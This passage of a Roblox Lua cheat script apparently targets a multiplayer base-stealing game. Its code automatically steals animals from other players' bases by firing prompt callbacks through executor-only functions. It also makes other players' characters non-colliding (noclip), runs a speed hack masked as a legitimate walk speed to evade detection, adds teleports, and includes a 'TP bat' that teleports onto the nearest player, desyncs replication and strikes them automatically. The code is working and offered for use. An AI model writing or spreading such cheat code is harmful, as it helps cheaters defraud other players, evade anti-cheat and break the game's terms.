    if type(path)=="table" then return path end
    local out={}
    for part in string.gmatch(tostring(path),"[^%.]+") do
        table.insert(out, tonumber(part) or part)
    end
    return out
end

local function resolveSyncPath(path, root)
    local current,parent,key=root,nil,nil
    for _,part in ipairs(splitSyncPath(path)) do
        parent=current; key=part
        current=current and current[part] or nil
    end
    return current,parent,key
end

local function applyPlotSyncDiff(channelName, packet)
    local cache=plotAnimalSync.caches[channelName]
    if type(cache)~="table" then return end
    local path,action,a,b=packet[1],packet[2],packet[3],packet[4]
    local current,parent,key=resolveSyncPath(path,cache)
    if action=="Changed" then if parent then parent[key]=a end
    elseif action=="ArrayInsert" then if current then table.insert(current,b,a) end
    elseif action=="ArrayRemoved" then if current then table.remove(current,b) end
    elseif action=="DictionaryInsert" then if current then current[b]=a end
    elseif action=="DictionaryRemoved" then if current then current[b]=nil end
    end
end

local function attachPlotChannel(remote)
    if not plots or not syncRemotes then return end
    if plotAnimalSync.connections[remote] then return end
    local channelName=tostring(remote.Name)
    if not plots:FindFirstChild(channelName) then return end
    if syncRemotes.requestData and plotAnimalSync.caches[channelName]==nil then
        local ok,data=pcall(function() return syncRemotes.requestData:InvokeServer(channelName) end)
        plotAnimalSync.caches[channelName]=(ok and type(data)=="table") and data or {}
    elseif plotAnimalSync.caches[channelName]==nil then
        plotAnimalSync.caches[channelName]={}
    end
    plotAnimalSync.connections[remote]=remote.OnClientEvent:Connect(function(queue)
        for _,packet in ipairs(queue) do applyPlotSyncDiff(channelName,packet) end
    end)
end

local function detachPlotChannel(channelName)
    for remote,conn in pairs(plotAnimalSync.connections) do
        if tostring(remote.Name)==tostring(channelName) then
            conn:Disconnect(); plotAnimalSync.connections[remote]=nil
            plotAnimalSync.caches[tostring(channelName)]=nil; break
        end
    end
end

pcall(function()
    if not syncRemotes then return end
    for _,child in ipairs(syncRemotes.channelFolder:GetChildren()) do
        if child:IsA("RemoteEvent") then attachPlotChannel(child) end
    end
    syncRemotes.channelFolder.ChildAdded:Connect(function(child)
        if child:IsA("RemoteEvent") then attachPlotChannel(child) end
    end)
    syncRemotes.routeRemote.OnClientEvent:Connect(function(actions)
        for _,action in ipairs(actions) do
            local kind,channelName=action[1],tostring(action[2])
            if not plots:FindFirstChild(channelName) then continue end
            if kind=="ListenerAdded" then
                local r=syncRemotes.channelFolder:FindFirstChild(channelName)
                if r and r:IsA("RemoteEvent") then attachPlotChannel(r) end
            elseif kind=="ListenerRemoved" then detachPlotChannel(channelName) end
        end
    end)
end)

local function getPlotOwner(plot)
    local sign=plot:FindFirstChild("PlotSign")
    local frame=sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
    local label=frame and frame:FindFirstChild("TextLabel")
    if not label or label.Text=="Empty Base" then return nil end
    return label.Text:gsub("'s [Bb]ase$",""):gsub("%s+$","")
end

local function isMyBaseAnimal(animalData)
    if not animalData or not animalData.plot then return false end
    local plot=plots and plots:FindFirstChild(animalData.plot); if not plot then return false end
    local sign=plot:FindFirstChild("PlotSign")
    if sign then local yb=sign:FindFirstChild("YourBase"); if yb and yb:IsA("BillboardGui") then return yb.Enabled==true end end
    return getPlotOwner(plot)==LP.DisplayName
end

local function scanAllPlots()
    if not plots then return end
    local newCache={}
    for _,plot in ipairs(plots:GetChildren()) do
        local cache=plotAnimalSync.caches[plot.Name]; if not cache then continue end
        local animalList=cache.AnimalList; if type(animalList)~="table" then continue end
        for slot,animalData in pairs(animalList) do
            if type(animalData)=="table" then
                local animalName=animalData.Index
                local displayName=animalName
                if AnimalsData then local info=AnimalsData[animalName]; if info then displayName=info.DisplayName or animalName end end
                table.insert(newCache,{name=displayName,plot=plot.Name,slot=tostring(slot),uid=plot.Name.."_"..tostring(slot)})
            end
        end
    end
    allAnimalsCache=newCache
end

task.spawn(function() while true do task.wait(5); pcall(scanAllPlots) end end)
pcall(scanAllPlots)

local function getAnimalPosition(animalData)
    if not plots then return nil end
    local plot=plots:FindFirstChild(animalData.plot); if not plot then return nil end
    local podiums=plot:FindFirstChild("AnimalPodiums"); if not podiums then return nil end
    local podium=podiums:FindFirstChild(animalData.slot); if not podium then return nil end
    return podium:GetPivot().Position
end

local function distToAnimal(animalData)
    local char=LP.Character; if not char then return math.huge end
    local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return math.huge end
    local pos=getAnimalPosition(animalData); if not pos then return math.huge end
    return (hrp.Position-pos).Magnitude
end

local function findProximityPromptForAnimal(animalData)
    if not animalData then return nil end
    local cached=SemiPromptCache[animalData.uid]
    if cached and cached.Parent then return cached end
    if not plots then return nil end
    local plot=plots:FindFirstChild(animalData.plot); if not plot then return nil end
    local podiums=plot:FindFirstChild("AnimalPodiums"); if not podiums then return nil end
    local podium=podiums:FindFirstChild(animalData.slot); if not podium then return nil end
    local base=podium:FindFirstChild("Base"); if not base then return nil end
    local spawn=base:FindFirstChild("Spawn"); if not spawn then return nil end
    local attach=spawn:FindFirstChild("PromptAttachment"); if not attach then return nil end
    for _,p in ipairs(attach:GetChildren()) do
        if p:IsA("ProximityPrompt") then SemiPromptCache[animalData.uid]=p; return p end
    end
    return nil
end

local function pickClosest()
    local char=LP.Character; if not char then return nil end
    local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return nil end
    local best,bestDist=nil,math.huge
    for _,animalData in ipairs(allAnimalsCache) do
        if isMyBaseAnimal(animalData) then continue end
        local pos=getAnimalPosition(animalData); if not pos then continue end
        local dist=(hrp.Position-pos).Magnitude
        if dist<bestDist then bestDist=dist; best=animalData end
    end
    return best
end

local function buildSemiCallbacks(prompt)
    if SemiCallbackCache[prompt] then return end
    local data={holdCallbacks={},triggerCallbacks={},ready=true}
    local ok1,conns1=pcall(getconnections,prompt.PromptButtonHoldBegan)
    if ok1 and type(conns1)=="table" then
        for _,conn in ipairs(conns1) do if type(conn.Function)=="function" then table.insert(data.holdCallbacks,conn.Function) end end
    end
    local ok2,conns2=pcall(getconnections,prompt.Triggered)
    if ok2 and type(conns2)=="table" then
        for _,conn in ipairs(conns2) do if type(conn.Function)=="function" then table.insert(data.triggerCallbacks,conn.Function) end end
    end
    if #data.holdCallbacks>0 or #data.triggerCallbacks>0 then SemiCallbackCache[prompt]=data end
end

local function executeSemiStealAsync(prompt, animalData)
    local data=SemiCallbackCache[prompt]
    if not data or not data.ready then return false end
    data.ready=false
    SemiSteal.State.active=true; SemiSteal.State.startTime=tick(); SemiSteal.State.inRange=false
    task.spawn(function()
        for _,fn in ipairs(data.holdCallbacks) do task.spawn(fn) end
        task.wait(SEMI_CONFIG.HOLD_MIN)
        while true do
            local elapsed=tick()-SemiSteal.State.startTime
            local near = false
            pcall(function() near = distToAnimal(animalData) <= SEMI_CONFIG.STEAL_RANGE end)
            SemiSteal.State.inRange = near and prompt.Parent ~= nil
            if elapsed>SEMI_CONFIG.HOLD_MAX then break end
            if not prompt.Parent then break end
            if near then
                task.wait(SEMI_CONFIG.ENTRY_DELAY)
                local stillNear = false
                pcall(function() stillNear = distToAnimal(animalData) <= SEMI_CONFIG.STEAL_RANGE end)
                SemiSteal.State.inRange = stillNear
                if stillNear then
                    for _,fn in ipairs(data.triggerCallbacks) do task.spawn(fn) end
                end
                break
            end
            task.wait()
        end
        SemiSteal.State.active=false; SemiSteal.State.inRange=false
        task.wait(0.05); data.ready=true
    end)
    return true
end

local function attemptSemiSteal(prompt, animalData)
    if not prompt or not prompt.Parent then return false end
    buildSemiCallbacks(prompt)
    if not SemiCallbackCache[prompt] then return false end
    return executeSemiStealAsync(prompt, animalData)
end

local semiConn=nil

startSemiAutoSteal=function()
    if semiConn then return end
    semiConn=RunService.Heartbeat:Connect(function()
        if not Steal.AutoStealEnabled then return end
        if SemiSteal.State.active then return end
        local target=pickClosest(); if not target then return end
        local prompt=SemiPromptCache[target.uid]
        if not prompt or not prompt.Parent then prompt=findProximityPromptForAnimal(target) end
        if prompt then attemptSemiSteal(prompt,target) end
    end)
end

stopSemiAutoSteal=function()
    if semiConn then semiConn:Disconnect(); semiConn=nil end
    SemiSteal.State.active=false; SemiSteal.State.inRange=false
end

end)() -- end semi-auto steal scope

local _noclipAccum = 0
RunService.Heartbeat:Connect(function(dt)
    _noclipAccum = _noclipAccum + dt
    if _noclipAccum < 0.2 then return end
    _noclipAccum = 0
    local myChar = LP.Character
    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    if not myRoot then return end
    local myPos = myRoot.Position
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            local hrp = p.Character:FindFirstChild("HumanoidRootPart")
            if hrp and (hrp.Position - myPos).Magnitude < 80 then
                for _, part in ipairs(p.Character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        end
    end
end)
-- VICIOUS CLOAKED STRIDE (speed engine)
local _strideTickN = 0
local _legitMask = 16
local _strideRayParams = RaycastParams.new()
_strideRayParams.FilterType = Enum.RaycastFilterType.Exclude

local function _strideResolveUnit(hum)
    local dir = hum.MoveDirection
    if dir.Magnitude > 0.05 then
        lastMoveDir = dir
        return dir.Unit
    end
    if antiRagdollEnabled and lastMoveDir and lastMoveDir.Magnitude > 0 then
        for key in pairs(MOVE_KEYS) do
            if UIS:IsKeyDown(key) then
                return lastMoveDir.Unit
            end
        end
    end
    lastMoveDir = Vector3.zero
    return nil
end

local function _safeStride(root, hum, unit, step)
    if step < 0.02 then return end
    local pos = root.Position
    if pos.Y < -40 or pos.Y > 400 then return end
    _strideRayParams.FilterDescendantsInstances = {root.Parent}
    local wall = workspace:Raycast(pos + Vector3.new(0, 1.2, 0), unit * (step + 1.0), _strideRayParams)
    if wall then
        step = math.max(0, (wall.Position - pos).Magnitude - 1.0)
        if step < 0.02 then return end
    end
    local ground = workspace:Raycast(pos + Vector3.new(unit.X * step, 2, unit.Z * step), Vector3.new(0, -12, 0), _strideRayParams)
    if not ground and hum.FloorMaterial == Enum.Material.Air then
        step = math.min(step, 0.25)
    end
    local newPos = pos + Vector3.new(unit.X * step, 0, unit.Z * step)
    root.CFrame = CFrame.new(newPos) * (root.CFrame - root.CFrame.Position)
end

local function applyCloakedStride(dt)
    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not char or not hum or not root or hum.Health <= 0 then return end

    -- clear old LinearVelocity speed if present
    if speedLinearVelocity then
        pcall(function() speedLinearVelocity.PlaneVelocity = Vector2.zero end)
    end

    if autoBatEnabled or autoLeftEnabled or autoRightEnabled then
        return
    end
    -- network bypass can run alongside cloaked stride

    if isRagdollState(hum) then
        lastMoveDir = Vector3.zero
        return
    end
    local st = hum:GetState()
    if st == Enum.HumanoidStateType.Physics
        or st == Enum.HumanoidStateType.Ragdoll
        or st == Enum.HumanoidStateType.Dead
        or st == Enum.HumanoidStateType.Swimming then
        lastMoveDir = Vector3.zero
        return
    end

    local unit = _strideResolveUnit(hum)
    if not unit then return end

    dt = math.clamp(typeof(dt) == "number" and dt or (1 / 60), 0.001, 0.04)
    _strideTickN = _strideTickN + 1

    local target = getActiveMoveSpeed()
    local mode = "normal"
    if laggerModeEnabled then mode = "lagger"
    elseif carrySpeedActive then mode = "carry" end

    local mask = _legitMask
    if hum.WalkSpeed > 0 and hum.WalkSpeed < 20 then
        mask = hum.WalkSpeed
    end

    local y = 0
    pcall(function() y = root.AssemblyLinearVelocity.Y end)
    root.AssemblyLinearVelocity = Vector3.new(unit.X * mask, y, unit.Z * mask)

    local extra = target - mask
    if extra < 1 then return end

    if mode == "normal" then
        local step = math.min(extra * dt, 1.6)
        _safeStride(root, hum, unit, step)
    elseif mode == "carry" then
        if _strideTickN % 2 == 0 then
            local step = math.min(extra * dt * 1.15, 1.1)
            _safeStride(root, hum, unit, step)
        end
    else
        local phase = (_strideTickN % 5)
        if phase <= 2 then
            _safeStride(root, hum, unit, math.min(extra * dt * 1.05, 1.0))
        elseif phase == 3 then
            _safeStride(root, hum, unit, math.min(extra * dt * 0.4, 0.45))
        end
    end
end

do
    local lastT = os.clock()
    RunService.Heartbeat:Connect(function()
        local now = os.clock()
        local dt = now - lastT
        lastT = now
        applyCloakedStride(dt)
        -- speed label
        local char = LP.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if speedLabel and speedLabel.Parent and hrp then
            local real = 0
            pcall(function()
                local v = hrp.AssemblyLinearVelocity
                real = Vector3.new(v.X, 0, v.Z).Magnitude
            end)
            local target = getActiveMoveSpeed()
            if real < 0.5 then
                speedLabel.Text = "0"
            else
                speedLabel.Text = formatSpeedValue(target)
            end
        elseif char and (not speedLabel or not speedLabel.Parent) then
            pcall(function()
                if setupSpeedIndicator then setupSpeedIndicator(char) end
            end)
        end
    end)
end
LP.CharacterAdded:Connect(function(char)
    destroySpeedConstraint()
    clearAppearancePartState(AppearanceState.headlessParts)
    clearAppearancePartState(AppearanceState.korbloxParts)
    task.wait(0.5);setupSpeedIndicator(char);setupRagdollTriggers()
    if headlessEnabled then
        local ok, err = setHeadlessAppearance(true)
        if not ok then warn("Headless failed after respawn: " .. tostring(err)) end
    end
    if bodyColorMode and bodyColorMode ~= "Normal" then
        task.delay(0.35, function()
            pcall(function() setBodyColorMode(bodyColorMode) end)
            if korbloxEnabled then pcall(function() setKorbloxAppearance(true) end) end
        end)
    end
    -- Body Lock removed
    if korbloxEnabled then
        local ok, err = setKorbloxAppearance(true)
        if not ok then warn("Korblox failed after respawn: " .. tostring(err)) end
    end
    if medusaCounterEnabled then
        setupRagdollTriggers()
        if type(setupMedusa) == "function" then
            setupMedusa(char)
        end
    end
    if batThemeMode and batThemeMode~="Normal" and refreshBatToolTheme then task.defer(refreshBatToolTheme) end
    if batCounterEnabled then startBatCounter() end
    if unwalkEnabled then task.wait(0.5);startUnwalk() end
    if refreshSpeedModeLabel then refreshSpeedModeLabel() end
    if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive) end
    if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerModeEnabled) end
end)
if LP.Character then
    setupSpeedIndicator(LP.Character)
    setupRagdollTriggers()
end
alConn,arConn=nil,nil;alPhase,arPhase=1,1
stopAutoLeft=function()
    if alConn then alConn:Disconnect();alConn=nil end;alPhase=1
    local char=LP.Character;if char then
        local h=char:FindFirstChildOfClass("Humanoid");if h then h:Move(Vector3.zero,false) end
        local root=char:FindFirstChild("HumanoidRootPart")
        if root then root.AssemblyLinearVelocity=Vector3.new(0,root.AssemblyLinearVelocity.Y,0) end
    end
    if autoLeftSetVisual then autoLeftSetVisual(false) end
    if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end
end
stopAutoRight=function()
    if arConn then arConn:Disconnect();arConn=nil end;arPhase=1
    local char=LP.Character;if char then
        local h=char:FindFirstChildOfClass("Humanoid");if h then h:Move(Vector3.zero,false) end
        local root=char:FindFirstChild("HumanoidRootPart")
        if root then root.AssemblyLinearVelocity=Vector3.new(0,root.AssemblyLinearVelocity.Y,0) end
    end
    if autoRightSetVisual then autoRightSetVisual(false) end
    if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end
end
local function moveOnAutoPath(root, humanoid, destination, speed)
    speed = tonumber(speed) or 59
    local flatDelta=Vector3.new(destination.X-root.Position.X,0,destination.Z-root.Position.Z)
    if flatDelta.Magnitude<1 then return true end
    local direction=flatDelta.Unit
    pcall(function()
        humanoid.WalkSpeed = speed
        humanoid:Move(direction, false)
    end)
    root.AssemblyLinearVelocity = Vector3.new(direction.X * speed, root.AssemblyLinearVelocity.Y, direction.Z * speed)
    -- LinearVelocity constraint if present
    pcall(function()
        local lv = root:FindFirstChild("_OceanSpeedLV") or (speedLinearVelocity)
        if lv and lv.Parent then
            lv.PlaneVelocity = Vector2.new(direction.X * speed, direction.Z * speed)
        end
    end)
    return false
end

local autoPathSwingDebounce={}
local function swingDuringAutoPath(char, humanoid, debounceName)
    if not autoMoveSwingEnabled or autoPathSwingDebounce[debounceName] then return end
    local held = char and char:FindFirstChildOfClass("Tool")
    if held then
        local hn = held.Name:lower()
        if not (hn:find("bat") or hn:find("slap")) then return end
    end
    autoPathSwingDebounce[debounceName]=true
    local bat=findBat()
    if bat then
        if bat.Parent~=char then pcall(function() humanoid:EquipTool(bat) end) end
        pcall(function() bat:Activate() end)
    end
    task.delay(autoMoveSwingInterval,function() autoPathSwingDebounce[debounceName]=false end)
end

startAutoLeft=function()
    if alConn then alConn:Disconnect() end
    destroySpeedConstraint();alPhase=1
    pcall(function()
        if isHoldingCarryTool and isHoldingCarryTool() then enableCarryOnArrive() end
    end)
    alConn=RunService.Heartbeat:Connect(function()
        if not autoLeftEnabled then return end
        local char=LP.Character;if not char then return end
        local hrp=char:FindFirstChild("HumanoidRootPart");local hum=char:FindFirstChildOfClass("Humanoid");if not hrp or not hum then return end
        if isRagdollState(hum) then hum:Move(Vector3.zero,false);return end
        pcall(function()
            if isHoldingCarryTool and isHoldingCarryTool() and not carrySpeedActive then enableCarryOnArrive() end
        end)
        local destination=alPhase==1 and AP_L1 or AP_L2
        local pathSpd = getAutoPathSpeed()
        if moveOnAutoPath(hrp,hum,destination,pathSpd) then
            if alPhase==1 then alPhase=2;return end
            pcall(function()
                if isHoldingCarryTool and isHoldingCarryTool() then enableCarryOnArrive() end
            end)
            autoLeftEnabled=false;stopAutoLeft();return
        end
        swingDuringAutoPath(char,hum,"_alSwingDebounce")
    end)
end

startAutoRight=function()
    if arConn then arConn:Disconnect() end
    destroySpeedConstraint();arPhase=1
    pcall(function()
        if isHoldingCarryTool and isHoldingCarryTool() then enableCarryOnArrive() end
    end)
    arConn=RunService.Heartbeat:Connect(function()
        if not autoRightEnabled then return end
        local char=LP.Character;if not char then return end
        local hrp=char:FindFirstChild("HumanoidRootPart");local hum=char:FindFirstChildOfClass("Humanoid");if not hrp or not hum then return end
        if isRagdollState(hum) then hum:Move(Vector3.zero,false);return end
        pcall(function()
            if isHoldingCarryTool and isHoldingCarryTool() and not carrySpeedActive then enableCarryOnArrive() end
        end)
        local destination=arPhase==1 and AP_R1 or AP_R2
        local pathSpd = getAutoPathSpeed()
        if moveOnAutoPath(hrp,hum,destination,pathSpd) then
            if arPhase==1 then arPhase=2;return end
            pcall(function()
                if isHoldingCarryTool and isHoldingCarryTool() then enableCarryOnArrive() end
            end)
            autoRightEnabled=false;stopAutoRight();return
        end
        swingDuringAutoPath(char,hum,"_arSwingDebounce")
    end)
end

function runDrop()
    if dropActive then return end
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    if autoBatEnabled then
        autoBatEnabled = false
        if resetAutoBatMotion then resetAutoBatMotion() end
        if autoBatSetVisual then autoBatSetVisual(false) end
        if mobBtnRefs and mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
    end

    dropActive = true
    if mobBtnRefs and mobBtnRefs.drop then pcall(function() mobBtnRefs.drop(true) end) end

    local t0 = tick()
    if _dropConn then _dropConn:Disconnect(); _dropConn = nil end

    _dropConn = RunService.Heartbeat:Connect(function()
        local c = LP.Character
        local r = c and c:FindFirstChild("HumanoidRootPart")
        if not r or not dropActive then
            if _dropConn then _dropConn:Disconnect(); _dropConn = nil end
            dropActive = false
            if mobBtnRefs and mobBtnRefs.drop then pcall(function() mobBtnRefs.drop(false) end) end
            return
        end

        if tick() - t0 < DROP_ASCEND_DURATION then
            local lv = r.AssemblyLinearVelocity
            r.AssemblyLinearVelocity = Vector3.new(lv.X, DROP_ASCEND_SPEED, lv.Z)
            return
        end

        if _dropConn then _dropConn:Disconnect(); _dropConn = nil end
        pcall(function()
            local rp = RaycastParams.new()
            rp.FilterDescendantsInstances = {c}
            rp.FilterType = Enum.RaycastFilterType.Exclude
            local rr = workspace:Raycast(r.Position, Vector3.new(0, -3000, 0), rp)
            if rr then
                local hum = c:FindFirstChildOfClass("Humanoid")
                local offset = ((hum and hum.HipHeight) or 2) + (r.Size.Y / 2)
                r.CFrame = CFrame.new(r.Position.X, rr.Position.Y + offset, r.Position.Z)
                r.AssemblyLinearVelocity = Vector3.new(0, -15, 0)
            else
                r.CFrame = CFrame.new(r.Position.X, -7, r.Position.Z)
                r.AssemblyLinearVelocity = Vector3.zero
            end
        end)
        dropActive = false
        if mobBtnRefs and mobBtnRefs.drop then pcall(function() mobBtnRefs.drop(false) end) end
    end)
end

function stopDrop()
    dropActive = false
    if _dropConn then _dropConn:Disconnect(); _dropConn = nil end
    if mobBtnRefs and mobBtnRefs.drop then pcall(function() mobBtnRefs.drop(false) end) end
end

function mirrorTPAimbotActive()
    return autoBatEnabled == true
end

function mirrorTPTeleportDown()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid or humanoid.Health <= 0 then return end
    local now = tick()
    if now - (mirrorTPLastTeleport or 0) < 0.08 then return end
    mirrorTPLastTeleport = now
    local _, yaw = root.CFrame:ToEulerAnglesYXZ()
    local y = (MIRROR_TP_DOWN_Y or -7) + (math.random() * 0.6 - 0.3)
    root.CFrame = CFrame.new(root.Position.X, y, root.Position.Z) * CFrame.Angles(0, yaw, 0)
    root.AssemblyLinearVelocity = Vector3.new((math.random()-0.5)*0.4, 0, (math.random()-0.5)*0.4)
end

if not _mirrorTPStarted then
    _mirrorTPStarted = true
    RunService.Heartbeat:Connect(function()
        if not mirrorTPDownEnabled or not mirrorTPAimbotActive() then
            if next(mirrorTPPreviousY) then
                for k in pairs(mirrorTPPreviousY) do mirrorTPPreviousY[k] = nil end
            end
            return
        end
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and plr.Character then
                local root = plr.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    local currentY = root.Position.Y
                    local previousY = mirrorTPPreviousY[plr.UserId]
                    if previousY and previousY - currentY >= (MIRROR_TP_DROP_THRESHOLD or 3) then
                        pcall(mirrorTPTeleportDown)
                        for k in pairs(mirrorTPPreviousY) do mirrorTPPreviousY[k] = nil end
                        return
                    end
                    mirrorTPPreviousY[plr.UserId] = currentY
                end
            end
        end
    end)
end

function setMirrorTPDown(enabled)
    mirrorTPDownEnabled = enabled == true
    if not mirrorTPDownEnabled then
        for k in pairs(mirrorTPPreviousY) do mirrorTPPreviousY[k] = nil end
    end
end

function doAutoTPDown(force)
    local char = LP.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local hum2 = char:FindFirstChildOfClass("Humanoid")
    if not hum2 then return end
    if not force then
        if hum2.FloorMaterial ~= Enum.Material.Air then return end
        if not (hrp.Position.Y >= (autoTPHeight or 20)) then return end
    end
    local _, yaw = hrp.CFrame:ToEulerAnglesYXZ()
    hrp.CFrame = CFrame.new(hrp.Position.X, -7.00, hrp.Position.Z) * CFrame.Angles(0, yaw, 0)
    pcall(function() hrp.AssemblyLinearVelocity = Vector3.zero end)
    pcall(function() hrp.Velocity = Vector3.zero end)
end
startAutoTP=function()
    if autoTPConn then task.cancel(autoTPConn);autoTPConn=nil end
    autoTPConn=task.spawn(function() while autoTPEnabled do task.wait(0.1);pcall(function() doAutoTPDown(false) end) end end)
end
stopAutoTP=function() autoTPEnabled=false;if autoTPConn then task.cancel(autoTPConn);autoTPConn=nil end end
runTPFloor=function() pcall(function() doAutoTPDown(true) end) end

do
    batDesyncTpConn = nil
    hittingCooldownDesync = false

    function getBatDesync()
        local char=LP.Character; if not char then return nil end
        local held = char:FindFirstChildOfClass("Tool")
        if held then
            local hn = string.lower(held.Name)
            if hn:find("bat", 1, true) or hn:find("slap", 1, true) then
                return held
            end
            return nil
        end
        local tool=char:FindFirstChild("Bat"); if tool then return tool end
        local bp2=LP:FindFirstChild("Backpack")
        if bp2 then tool=bp2:FindFirstChild("Bat"); if tool then tool.Parent=char; return tool end end
        return nil
    end

    function tryHitBatDesync()
        if hittingCooldownDesync then return end; hittingCooldownDesync=true
        pcall(function()
            local bat=getBatDesync(); if bat then
                bat:Activate(); local ev=bat:FindFirstChildWhichIsA("RemoteEvent")
                if ev then ev:FireServer() end
            end
        end)
        task.delay(0.08, function() hittingCooldownDesync=false end)
    end

    function getClosestPlayerDesync()
        local char = LP.Character
        if not char then return nil,math.huge end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return nil,math.huge end
        local cp,cd=nil,math.huge
        for _,p in pairs(Players:GetPlayers()) do
            if p~=LP and p.Character then
                local tr=p.Character:FindFirstChild("HumanoidRootPart")
                if tr then local d=(hrp.Position-tr.Position).Magnitude; if d<cd then cd=d; cp=p end end
            end
        end
        return cp,cd
    end

    _tpBatV2Samples = _tpBatV2Samples or {}
    function batDesyncTpUpdateV1()
        if not TPBat.enabled then return end
        local char = LP.Character
        if not char then return end
        if isHoldingCarryTool and isHoldingCarryTool() then
            if TPBat.stop then TPBat.stop() end
            if mobBtnRefs and mobBtnRefs.tpBat then pcall(function() mobBtnRefs.tpBat(false) end) end
            return
        end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local target = select(1, getClosestPlayerDesync())
        if target and target.Character then
            local tr = target.Character:FindFirstChild("HumanoidRootPart")
            if tr then
                if sethiddenproperty then
                    pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", tr) end)
                end
                local targetPos = tr.Position + Vector3.new(0, 0.9, 0)
                if (hrp.Position - targetPos).Magnitude > (tpBatDistance or 8) then
                    hrp.CFrame = CFrame.new(targetPos)
                end
                local cam = workspace.CurrentCamera
                if cam then cam.CFrame = CFrame.new(cam.CFrame.Position, tr.Position) end
                tryHitBatDesync()
            end
        end
    end
    function batDesyncTpUpdateV2()
        if not TPBat.enabled then return end
        local char = LP.Character
        if not char then return end
        if isHoldingCarryTool and isHoldingCarryTool() then
            if TPBat.stop then TPBat.stop() end
            if mobBtnRefs and mobBtnRefs.tpBat then pcall(function() mobBtnRefs.tpBat(false) end) end
            return
        end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local target = select(1, getClosestPlayerDesync())
        if not (target and target.Character) then return end
        local tr = target.Character:FindFirstChild("HumanoidRootPart")
        local th = target.Character:FindFirstChildOfClass("Humanoid")
        if not tr or not th or th.Health <= 0 then return end
        local uid = target.UserId
        local now = tick()
        local samples = _tpBatV2Samples[uid]
        if not samples then samples = {}; _tpBatV2Samples[uid] = samples end
        samples[#samples+1] = {t=now, p=tr.Position, v=tr.AssemblyLinearVelocity}
        while #samples > 8 do table.remove(samples, 1) end
        local safePos, suspicious = tr.Position, false
        if #samples >= 2 then
            local a, b = samples[#samples-1], samples[#samples]
            local jump = (b.p - a.p).Magnitude
            if jump > 80 or b.p.Y < -50 or b.p.Y > 500 then
                suspicious = true
                safePos = a.p
            else
                safePos = b.p + (b.v or Vector3.zero) * 0.05
            end
        end
        if sethiddenproperty then
            pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", tr) end)
        end
        local dist = (tpBatDistance or 8)
        local targetPos
        if suspicious then
            targetPos = Vector3.new(safePos.X, hrp.Position.Y, safePos.Z)
        else
            targetPos = Vector3.new(tr.Position.X, tr.Position.Y + 0.9, tr.Position.Z)
        end
        if (hrp.Position - targetPos).Magnitude > dist then
            pcall(function()
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
                local face = Vector3.new(tr.CFrame.LookVector.X, 0, tr.CFrame.LookVector.Z)
                if face.Magnitude < 0.01 then face = Vector3.new(0, 0, -1) end
                hrp.CFrame = CFrame.lookAt(targetPos, targetPos + face.Unit)
            end)
        end
        local cam = workspace.CurrentCamera
        if cam then cam.CFrame = CFrame.new(cam.CFrame.Position, tr.Position) end
        tryHitBatDesync()
    end
    function batDesyncTpUpdate()
        if tostring(tpBatVersion or "v1") == "v2" then
            batDesyncTpUpdateV2()
        else
            batDesyncTpUpdateV1()
        end
    end

    TPBat.start=function()
        if batDesyncTpConn then return end
        if isHoldingCarryTool and isHoldingCarryTool() then
            TPBat.enabled = false
            if TPBat.setVisual then TPBat.setVisual(false) end
            if mobBtnRefs and mobBtnRefs.tpBat then pcall(function() mobBtnRefs.tpBat(false) end) end
            return
        end
        TPBat.enabled = true
        batDesyncTpConn = RunService.Heartbeat:Connect(batDesyncTpUpdate)
        if TPBat.setVisual then TPBat.setVisual(true) end
    end

    TPBat.stop=function()
        if batDesyncTpConn then batDesyncTpConn:Disconnect(); batDesyncTpConn = nil end
        TPBat.enabled = false
        if TPBat.setVisual then TPBat.setVisual(false) end
    end
end
STRETCH_NAME="Movee_Stretch"
enableStretchRez=function()
    stretchRezEnabled = true
    if stretchRezConn then pcall(function() stretchRezConn:Disconnect() end); stretchRezConn = nil end
    pcall(function() RunService:UnbindFromRenderStep(STRETCH_NAME) end)
    local function applyStretch()
        if not stretchRezEnabled then return end
        local cam = workspace.CurrentCamera
        if not cam then return end
        pcall(function()
            cam.CFrame = cam.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, 0.75, 0, 0, 0, 1)
        end)
    end
    pcall(function()
        RunService:BindToRenderStep(STRETCH_NAME, Enum.RenderPriority.Camera.Value + 1, applyStretch)
    end)
    stretchRezConn = RunService.RenderStepped:Connect(function()
        if stretchRezEnabled then applyStretch() end
    end)
end
disableStretchRez=function()
    stretchRezEnabled = false
    pcall(function() RunService:UnbindFromRenderStep(STRETCH_NAME) end)
    if stretchRezConn then pcall(function() stretchRezConn:Disconnect() end); stretchRezConn = nil end
end

function applyAntiLagDerender(obj)
    pcall(function()
        if obj:IsA("Accessory") or obj:IsA("Hat") then obj:Destroy()
        elseif obj:IsA("BasePart") then obj.Material=Enum.Material.Plastic;obj.Reflectance=0;obj.CastShadow=false
